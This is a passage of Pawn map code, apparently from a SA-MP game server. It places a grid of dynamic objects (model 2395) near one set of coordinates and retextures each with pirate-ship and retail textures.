	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1748.897,-1861.056,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1752.628,-1861.051,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1756.342,-1861.046,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1760.083,-1861.040,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1763.826,-1861.035,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1771.289,-1861.023,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1767.557,-1861.028,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1775.010,-1861.016,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1778.741,-1861.009,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1782.462,-1861.002,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1786.173,-1860.997,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1789.894,-1860.991,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1797.335,-1860.978,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1793.625,-1860.985,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1801.054,-1860.971,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1804.784,-1860.964,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1808.435,-1860.960,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1730.255,-1858.342,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1726.524,-1858.348,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.805,-1858.355,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.805,-1858.355,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1733.967,-1858.337,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1737.697,-1858.340,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1741.408,-1858.333,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1745.118,-1858.327,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1748.838,-1858.320,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1752.567,-1858.313,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1756.277,-1858.307,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1760.007,-1858.301,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1763.716,-1858.294,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1767.427,-1858.288,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1771.157,-1858.281,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1774.887,-1858.274,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1782.336,-1858.260,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1778.616,-1858.266,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1786.056,-1858.253,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1789.766,-1858.246,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1793.486,-1858.240,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1797.215,-1858.233,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1800.955,-1858.226,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1804.685,-1858.219,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1808.415,-1858.213,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1726.519,-1855.608,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1726.514,-1852.868,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1726.510,-1850.128,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1722.790,-1850.142,12.474,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1730.251,-1855.602,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1730.246,-1852.862,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1730.241,-1850.132,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1733.962,-1855.607,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1733.957,-1852.866,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1733.952,-1850.126,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1737.692,-1855.611,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1737.688,-1852.881,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1737.683,-1850.141,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1741.403,-1855.623,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1741.398,-1852.893,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1741.393,-1850.154,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1745.113,-1855.607,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1745.108,-1852.887,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1745.103,-1850.156,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1748.833,-1855.600,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1748.828,-1852.880,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1748.824,-1850.150,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1752.563,-1855.584,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1752.558,-1852.863,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1752.553,-1850.123,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
